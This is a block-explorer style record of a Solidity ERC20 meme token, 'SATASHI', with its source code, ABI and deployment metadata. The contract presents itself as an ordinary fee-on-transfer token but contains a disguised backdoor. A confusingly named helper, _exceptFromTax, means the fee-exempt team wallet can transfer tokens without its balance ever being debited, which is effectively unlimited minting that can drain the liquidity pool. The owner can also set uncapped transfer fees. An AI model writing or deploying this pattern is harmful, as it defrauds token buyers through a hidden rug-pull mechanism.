{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/*\r\nhttps://twitter.com/DegenerateNews/status/1747640640140100002\r\n\r\nhttps://t.me/satashi_ERC\r\n*/\r\n\r\npragma solidity 0.8.19;\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    constructor(address owner) {\r\n        _owner = owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_isOwner(msg.sender), \"!OWNER\");\r\n        _;\r\n    }\r\n\r\n    function _isOwner(address account) internal view returns (bool) {\r\n        return account == _owner;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address _pairAddress);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract SATASHI is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private constant _name = \"Satashi Nakamoto\";\r\n    string private constant _symbol = \"SATASHI\";\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private _totalSupply = 10 ** 9 * (10 ** _decimals);\r\n\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) _exceptFromFee;\r\n    mapping (address => bool) _exceptFromMaxTx;\r\n\r\n    address _routerAddr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address private _DEAD = 0x000000000000000000000000000000000000dEaD;\r\n\r\n    bool _swapEnabled = true;\r\n    uint256 _feeSwapThreshold = _totalSupply / 100000; // 0.1%\r\n    bool _swapping;\r\n\r\n    uint256 _maxTxAmount = (_totalSupply * 30) / 1000;\r\n    address _teamFeeReceiver;\r\n    IUniswapV2Router public uniswapRouter;\r\n    address _pairAddress;\r\n\r\n    uint256 private _liquidityFee = 0; \r\n    uint256 private _marketingFee = 22;\r\n    uint256 private _totalFees = _liquidityFee + _marketingFee;\r\n    uint256 private _denominator = 100;\r\n\r\n    modifier lockSwap() { _swapping = true; _; _swapping = false; }\r\n\r\n    constructor (address SatashiAddress) Ownable(msg.sender) {\r\n        uniswapRouter = IUniswapV2Router(_routerAddr);\r\n        _pairAddress = IUniswapV2Factory(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));\r\n        _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;\r\n        address _owner = _owner;\r\n        _teamFeeReceiver = SatashiAddress;\r\n        _exceptFromFee[_teamFeeReceiver] = true;\r\n        _exceptFromMaxTx[_owner] = true;\r\n        _exceptFromMaxTx[_teamFeeReceiver] = true;\r\n        _exceptFromMaxTx[_DEAD] = true;\r\n        _balances[_owner] = _totalSupply;\r\n        emit Transfer(address(0), _owner, _totalSupply);\r\n    }\r\n\r\n    receive() external payable { }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        if(_swapping){ return _transferBasic(sender, recipient, amount); }\r\n        \r\n        if (recipient != _pairAddress && recipient != _DEAD) {\r\n            require(_exceptFromMaxTx[recipient] || _balances[recipient] + amount <= _maxTxAmount, \"Transfer amount exceeds the bag size.\");\r\n        }        \r\n        if(_verifySwapping(sender, recipient, amount)){ \r\n            performSatashiSwap(); \r\n        } \r\n        bool shouldTax = _exceptFromTax(sender);\r\n        if (shouldTax) {\r\n            _balances[recipient] = _balances[recipient].add(_getReceivingAmount(sender, amount));\r\n        } else {\r\n            _balances[recipient] = _balances[recipient].add(amount);\r\n        }\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _isSelling(address recipient) private view returns (bool){\r\n        return recipient == _pairAddress;\r\n    }\r\n\r\n    function _validateSwapping() internal view returns (bool) {\r\n        return !_swapping\r\n        && _swapEnabled\r\n        && _balances[address(this)] >= _feeSwapThreshold;\r\n    }\r\n    \r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _exceptFromTax(address sender) internal view returns (bool) {\r\n        return !_exceptFromFee[sender];\r\n    }\r\n\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function getOwner() external view override returns (address) { return _owner; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n                  \r\n    function _verifySwapping(address sender, address recipient, uint256 amount) private view returns (bool) {\r\n        return _validateSwapping() && \r\n            _exceptFromTax(sender) && \r\n            _isSelling(recipient) && \r\n            amount > _feeSwapThreshold;\r\n    }\r\n    \r\n    function updateSatashiTax(uint256 lpFee, uint256 devFee) external onlyOwner {\r\n         _liquidityFee = lpFee; \r\n         _marketingFee = devFee;\r\n         _totalFees = _liquidityFee + _marketingFee;\r\n    }    \r\n    \r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function _transferBasic(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function performSatashiSwap() internal lockSwap {\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n        uint256 tokensToLp = contractTokenBalance.mul(_liquidityFee).div(_totalFees).div(2);\r\n        uint256 amountToSwap = contractTokenBalance.sub(tokensToLp);\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n\r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountToSwap,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n        uint256 amountETH = address(this).balance;\r\n        uint256 totalFeeTokens = _totalFees.sub(_liquidityFee.div(2));\r\n        uint256 ethToLp = amountETH.mul(_liquidityFee).div(totalFeeTokens).div(2);\r\n        uint256 ethToMarketing = amountETH.mul(_marketingFee).div(totalFeeTokens);\r\n\r\n        payable(_teamFeeReceiver).transfer(ethToMarketing);\r\n        if(tokensToLp > 0){\r\n            uniswapRouter.addLiquidityETH{value: ethToLp}(\r\n                address(this),\r\n                tokensToLp,\r\n                0,\r\n                0,\r\n                _teamFeeReceiver,\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function _getReceivingAmount(address sender, uint256 amount) internal returns (uint256) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        uint256 feeTokens = amount.mul(_totalFees).div(_denominator);\r\n        bool hasNoFee = sender == _owner;\r\n        if (hasNoFee) {\r\n            feeTokens = 0;\r\n        }\r\n        \r\n        _balances[address(this)] = _balances[address(this)].add(feeTokens);\r\n        emit Transfer(sender, address(this), feeTokens);\r\n        return amount.sub(feeTokens);\r\n    }\r\n    \r\n    function adjustSatashiWalletSize(uint256 percent) external onlyOwner {\r\n        _maxTxAmount = (_totalSupply * percent) / 1000;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != type(uint256).max){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"SatashiAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"name\":\"adjustSatashiWalletSize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapRouter\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"lpFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"devFee\",\"type\":\"uint256\"}],\"name\":\"updateSatashiTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "SATASHI", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000b77843cc53955640ce6e8c5d8b636afabf52ed6b", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://63bcfe451d9b4d9e1540b11f4ee5e7c41ffc027d12f021aa2f6635a8069e1669"}